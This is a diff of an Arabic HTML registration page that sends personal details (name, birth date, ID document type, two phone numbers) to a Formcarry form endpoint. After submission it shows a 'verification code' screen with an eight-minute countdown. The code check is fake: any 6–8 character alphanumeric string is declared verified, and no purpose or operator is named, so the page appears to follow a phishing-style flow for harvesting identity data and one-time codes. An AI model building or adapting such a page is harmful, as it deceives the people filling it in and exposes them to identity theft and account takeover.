@@ -2,19 +2,23 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>نموذج التسجيل</title>
+  <title>نموذج موحد</title>
   <style>
     body {
       background: linear-gradient(white, #ddd);
       font-family: Arial, sans-serif;
       padding: 20px;
     }
-    form {
+    .section {
+      display: none;
       background: #f5f5f5;
       padding: 20px;
       border-radius: 10px;
       max-width: 500px;
       margin: auto;
+    }
+    .section.active {
+      display: block;
     }
     label {
       display: block;
@@ -35,58 +39,73 @@
       border: none;
       border-radius: 6px;
       font-size: 16px;
+      cursor: pointer;
     }
-    .counter {
+    .counter, .timer {
       text-align: center;
       margin-top: 20px;
       color: #555;
+    }
+    .timer {
+      color: red;
     }
   </style>
 </head>
 <body>
 
-  <form id="userForm">
-    <h2 style="text-align:center;">نموذج التسجيل</h2>
+  <!-- ✅ القسم الأول: نموذج البيانات -->
+  <div id="formSection" class="section active">
+    <form id="userForm">
+      <h2 style="text-align:center;">نموذج التسجيل</h2>
 
-    <label>الاسم الثلاثي</label>
-    <input type="text" name="full_name" required>
+      <label>الاسم الثلاثي</label>
+      <input type="text" name="full_name" required>
 
-    <label>اللقب</label>
-    <input type="text" name="last_name" required>
+      <label>اللقب</label>
+      <input type="text" name="last_name" required>
 
-    <label>تاريخ الميلاد</label>
-    <input type="date" name="birth_date" required>
+      <label>تاريخ الميلاد</label>
+      <input type="date" name="birth_date" required>
 
-    <label>الجنس</label>
-    <select name="gender" required>
-      <option value="ذكر">ذكر</option>
-      <option value="أنثى">أنثى</option>
-    </select>
+      <label>الجنس</label>
+      <select name="gender" required>
+        <option value="ذكر">ذكر</option>
+        <option value="أنثى">أنثى</option>
+      </select>
 
-    <label>المستوى الدراسي</label>
-    <select name="education_level" required>
-      <option value="إعدادي">إعدادي</option>
-      <option value="ثانوي">ثانوي</option>
-      <option value="جامعي">جامعي</option>
-    </select>
+      <label>المستوى الدراسي</label>
+      <select name="education_level" required>
+        <option value="إعدادي">إعدادي</option>
+        <option value="ثانوي">ثانوي</option>
+        <option value="جامعي">جامعي</option>
+      </select>
 
-    <label>نوع المستند</label>
-    <select name="document_type" required>
-      <option value="جواز سفر">جواز سفر</option>
-      <option value="بطاقة شخصية">بطاقة شخصية</option>
-    </select>
+      <label>نوع المستند</label>
+      <select name="document_type" required>
+        <option value="جواز سفر">جواز سفر</option>
+        <option value="بطاقة شخصية">بطاقة شخصية</option>
+      </select>
 
-    <label>رقم الهاتف</label>
-    <input type="tel" name="phone" required>
+      <label>رقم الهاتف</label>
+      <input type="tel" name="phone" required>
 
-    <label>رقم هاتف احتياطي</label>
-    <input type="tel" name="alt_phone" required>
+      <label>رقم هاتف احتياطي</label>
+      <input type="tel" name="alt_phone" required>
 
-    <button type="submit">إرسال</button>
-  </form>
+      <button type="submit">إرسال</button>
+    </form>
 
-  <div class="counter">
-    عدد الزوار: <span id="visitorCount">0</span>
+    <div class="counter">
+      عدد الزوار: <span id="visitorCount">0</span>
+    </div>
+  </div>
+
+  <!-- ✅ القسم الثاني: كود التحقق -->
+  <div id="codeSection" class="section">
+    <h2 style="text-align:center;">أدخل رمز التحقق</h2>
+    <input type="text" id="codeInput" placeholder="مثال: A1B2C3" maxlength="8">
+    <button onclick="checkCode()">تحقق</button>
+    <div class="timer">المتبقي: <span id="countdown">8:00</span></div>
   </div>
 
   <script>
@@ -98,7 +117,7 @@
     }
     document.getElementById("visitorCount").textContent = localStorage.visitorCount;
 
-    // إرسال البيانات إلى Formcarry والانتقال لصفحة الكود
+    // إرسال النموذج إلى Formcarry ثم الانتقال إلى قسم الكود
     const form = document.getElementById('userForm');
     form.addEventListener('submit', function (e) {
       e.preventDefault();
@@ -107,15 +126,14 @@
       fetch('https://formcarry.com/s/12UxdOsTbaW', {
         method: 'POST',
         body: formData,
-        headers: {
-          Accept: 'application/json'
-        }
+        headers: { Accept: 'application/json' }
       })
       .then(response => {
         if (response.ok) {
-          window.location.href = "code.html";
+          showSection('codeSection');
+          startCountdown();
         } else {
-          alert("حدث خطأ أثناء الإرسال. حاول مرة أخرى.");
+          alert("حدث خطأ أثناء الإرسال.");
         }
       })
       .catch(error => {
@@ -123,6 +141,41 @@
         console.error(error);
       });
     });
+
+    // التنقل بين الأقسام
+    function showSection(id) {
+      document.getElementById("formSection").classList.remove("active");
+      document.getElementById("codeSection").classList.add("active");
+    }
+
+    // تحقق من كود التحقق
+    function checkCode() {
+      const code = document.getElementById("codeInput").value.trim();
+      if (/^[A-Za-z0-9]{6,8}$/.test(code)) {
+        alert("✅ تم التحقق من الرمز بنجاح.");
+      } else {
+        alert("⚠️ الرمز غير صالح. يجب أن يكون بين 6 و8 أرقام أو حروف.");
+      }
+    }
+
+    // عداد تنازلي 8 دقائق
+    let timer;
+    function startCountdown() {
+      let timeLeft = 8 * 60;
+      const countdown = document.getElementById("countdown");
+
+      timer = setInterval(() => {
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        countdown.textContent = `${minutes}:${seconds < 10 ? '0' + seconds : seconds}`;
+        if (timeLeft <= 0) {
+          clearInterval(timer);
+          alert("⛔ انتهى الوقت.");
+        }
+        timeLeft--;
+      }, 1000);
+    }
   </script>
+
 </body>
 </html>
